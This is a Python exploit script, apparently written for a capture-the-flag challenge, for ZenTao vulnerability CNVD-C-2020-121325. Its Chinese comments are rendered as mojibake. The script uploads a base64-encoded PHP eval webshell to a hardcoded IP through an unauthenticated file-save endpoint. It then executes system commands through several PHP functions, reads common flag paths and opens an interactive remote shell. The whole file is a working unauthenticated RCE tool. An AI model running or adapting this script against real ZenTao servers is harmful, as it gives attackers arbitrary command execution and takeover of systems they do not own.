#!/usr/bin/env python3
"""
CTF - ç¦…é“ (ZenTao) CNVD-C-2020-121325 æ¼æ´åˆ©ç”¨è„šæœ¬
æ¼æ´ç±»å‹: æœªæˆæƒä»»æ„æ–‡ä»¶ä¸Šä¼  / è¿œç¨‹ä»£ç æ‰§è¡Œ (RCE)
ç›®æ ‡: http://47.113.178.182:32829/zentao/data/client/1/shell.php
"""

import requests
import base64
import sys

# ç¦ç”¨SSLè­¦å‘Š
requests.packages.urllib3.disable_warnings()

class ZenTaoExploit:
    def __init__(self, base_url: str):
        self.base_url = base_url.rstrip('/')
        self.shell_url = f"{self.base_url}/zentao/data/client/1/shell.php"
        self.upload_url = f"{self.base_url}/zentao/index.php?m=client&f=save&t=txt&fileName=shell.php"
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })

    def check_shell_exists(self) -> bool:
        """æ£€æŸ¥ Webshell æ˜¯å¦å·²ç»å­˜åœ¨"""
        print(f"[*] æ£€æŸ¥ Webshell æ˜¯å¦å­˜åœ¨: {self.shell_url}")
        try:
            response = self.session.get(self.shell_url, timeout=10)
            if response.status_code == 200:
                print("[+] Webshell å·²å­˜åœ¨!")
                return True
            else:
                print(f"[-] Webshell ä¸å­˜åœ¨ (çŠ¶æ€ç : {response.status_code})")
                return False
        except Exception as e:
            print(f"[-] æ£€æŸ¥å¤±è´¥: {e}")
            return False

    def upload_shell(self) -> bool:
        """ä¸Šä¼  Webshell"""
        print("\n[*] å°è¯•ä¸Šä¼  Webshell...")

        # Webshell å†…å®¹: <?php @eval($_POST['cmd']);?>
        # éœ€è¦ base64 ç¼–ç 
        shell_content = "PD9waHAgQGV2YWwoJF9QT1NUWydjbWQnXSk7Pz4="

        try:
            response = self.session.post(
                self.upload_url,
                data=shell_content,
                timeout=10
            )

            print(f"[*] ä¸Šä¼ å“åº”çŠ¶æ€ç : {response.status_code}")

            # éªŒè¯æ˜¯å¦ä¸Šä¼ æˆåŠŸ
            if self.check_shell_exists():
                print("[+] Webshell ä¸Šä¼ æˆåŠŸ!")
                return True
            else:
                print("[-] Webshell ä¸Šä¼ å¯èƒ½å¤±è´¥")
                return False

        except Exception as e:
            print(f"[-] ä¸Šä¼ å¤±è´¥: {e}")
            return False

    def execute_command(self, command: str, cmd_param: str = 'cmd') -> str:
        """æ‰§è¡Œç³»ç»Ÿå‘½ä»¤"""
        print(f"\n[*] æ‰§è¡Œå‘½ä»¤: {command}")

        # æ„é€  POST æ•°æ®ï¼Œä½¿ç”¨ä¸åŒçš„æ‰§è¡Œæ–¹å¼
        payloads = [
            {cmd_param: f"system('{command}');"},
            {cmd_param: f"passthru('{command}');"},
            {cmd_param: f"echo shell_exec('{command}');"},
            {cmd_param: f"print(shell_exec('{command}'));"},
        ]

        for i, payload in enumerate(payloads):
            try:
                response = self.session.post(
                    self.shell_url,
                    data=payload,
                    timeout=10
                )

                if response.status_code == 200 and response.text.strip():
                    print(f"[+] å‘½ä»¤æ‰§è¡ŒæˆåŠŸ (æ–¹å¼ {i+1})!")
                    print("\n" + "=" * 70)
                    print("è¾“å‡ºç»“æœ:")
                    print("=" * 70)
                    print(response.text)
                    print("=" * 70)
                    return response.text

            except Exception as e:
                continue

        print("[-] æ‰€æœ‰æ‰§è¡Œæ–¹å¼éƒ½å¤±è´¥")
        return ""

    def find_flag(self) -> str:
        """è‡ªåŠ¨æŸ¥æ‰¾ Flag"""
        print("\n[*] å¼€å§‹æŸ¥æ‰¾ Flag...")

        # å¸¸è§çš„ Flag ä½ç½®
        flag_locations = [
            "/flag",
            "/flag.txt",
            "/var/www/html/flag.txt",
            "flag",
            "flag.txt",
            "../flag",
            "../flag.txt",
            "../../flag",
            "../../flag.txt",
            "/tmp/flag",
            "/tmp/flag.txt",
            "/home/flag",
            "/root/flag"
        ]

        # å…ˆå°è¯•åˆ—å‡ºæ ¹ç›®å½•å’Œå½“å‰ç›®å½•
        print("\n[Step 1] åˆ—å‡ºæ ¹ç›®å½•å†…å®¹:")
        root_content = self.execute_command("ls -la /")

        print("\n[Step 2] åˆ—å‡ºå½“å‰ç›®å½•å†…å®¹:")
        current_content = self.execute_command("pwd && ls -la")

        # å°è¯•è¯»å–å¸¸è§ä½ç½®çš„ Flag
        print("\n[Step 3] å°è¯•è¯»å– Flag æ–‡ä»¶:")
        for location in flag_locations:
            print(f"\n[*] å°è¯•è¯»å–: {location}")
            result = self.execute_command(f"cat {location}")

            # ç®€å•åˆ¤æ–­æ˜¯å¦æ‰¾åˆ° flag (é€šå¸¸åŒ…å« flag{ æˆ– CTF{ ç­‰)
            if result and any(keyword in result.lower() for keyword in ['flag{', 'ctf{', 'flag:', 'key:']):
                print(f"\n{'='*70}")
                print(f"ğŸš© æ‰¾åˆ° Flag!")
                print(f"{'='*70}")
                print(result)
                print(f"{'='*70}")
                return result

        print("\n[-] æœªåœ¨å¸¸è§ä½ç½®æ‰¾åˆ° Flag")
        print("[*] æç¤º: è¯·æ‰‹åŠ¨æ£€æŸ¥ä¸Šé¢çš„ç›®å½•åˆ—è¡¨ï¼ŒæŸ¥æ‰¾å¯ç–‘æ–‡ä»¶")
        return ""

    def interactive_shell(self):
        """äº¤äº’å¼å‘½ä»¤æ‰§è¡Œ"""
        print("\n[*] è¿›å…¥äº¤äº’æ¨¡å¼ (è¾“å…¥ 'exit' é€€å‡º)")
        print("[*] æç¤º: å¯ä»¥æ‰§è¡Œä»»æ„ç³»ç»Ÿå‘½ä»¤")
        print("-" * 70)

        while True:
            try:
                cmd = input("\n$ ").strip()
                if cmd.lower() in ['exit', 'quit', 'q']:
                    print("[*] é€€å‡ºäº¤äº’æ¨¡å¼")
                    break
                if not cmd:
                    continue

                self.execute_command(cmd)

            except KeyboardInterrupt:
                print("\n[*] é€€å‡ºäº¤äº’æ¨¡å¼")
                break
            except Exception as e:
                print(f"[-] é”™è¯¯: {e}")


def main():
    # ç›®æ ‡ URL
    target_url = "http://47.113.178.182:32829"

    print("""
â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
â•‘      ç¦…é“ (ZenTao) CNVD-C-2020-121325 æ¼æ´åˆ©ç”¨å·¥å…·            â•‘
â•‘      æœªæˆæƒä»»æ„æ–‡ä»¶ä¸Šä¼  / è¿œç¨‹ä»£ç æ‰§è¡Œ                       â•‘
â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
    """)

    print(f"[*] ç›®æ ‡: {target_url}")
    print(f"[*] Webshell è·¯å¾„: /zentao/data/client/1/shell.php")
    print("")

    exploit = ZenTaoExploit(target_url)

    # æ£€æŸ¥æˆ–ä¸Šä¼  shell
    if not exploit.check_shell_exists():
        print("\n[!] Webshell ä¸å­˜åœ¨ï¼Œå°è¯•ä¸Šä¼ ...")
        if not exploit.upload_shell():
            print("\n[-] æ¼æ´åˆ©ç”¨å¤±è´¥ï¼Œå¯èƒ½:")
            print("    1. ç›®æ ‡å·²ä¿®å¤æ¼æ´")
            print("    2. ç½‘ç»œè¿æ¥é—®é¢˜")
            print("    3. ç›®æ ‡è·¯å¾„æƒé™ä¸è¶³")
            sys.exit(1)

    # è‡ªåŠ¨æŸ¥æ‰¾ Flag
    flag = exploit.find_flag()

    if not flag:
        print("\n[*] è‡ªåŠ¨æŸ¥æ‰¾å¤±è´¥ï¼Œæ˜¯å¦è¿›å…¥äº¤äº’æ¨¡å¼? (y/n)")
        choice = input(">>> ").strip().lower()
        if choice in ['y', 'yes']:
            exploit.interactive_shell()

    print("\n[*] ä»»åŠ¡å®Œæˆ!")


if __name__ == "__main__":
    main()
